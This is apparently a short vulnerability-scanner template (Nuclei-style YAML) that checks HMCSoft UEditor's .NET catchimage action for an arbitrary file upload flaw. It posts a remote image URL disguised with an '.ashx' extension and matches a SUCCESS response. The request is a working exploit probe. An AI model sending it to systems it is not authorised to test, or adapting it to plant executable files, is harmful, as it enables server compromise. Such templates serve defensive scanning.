id: poc-yaml-hmcsoft-ueditor-action-catchimage-upload
info:
  name: HMCSoft UEditor File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
http:
  - method: POST
    path:
      - "/content/Js/ueditor/net/controller.ashx?action=catchimage"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      source[]=http://www.baidu.com/img/sug_bd.png?.ashx
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"state":"SUCCESS"'
          - "http://www.baidu.com/img/sug_bd.png?.ashx"
          - "source"
          - "list"
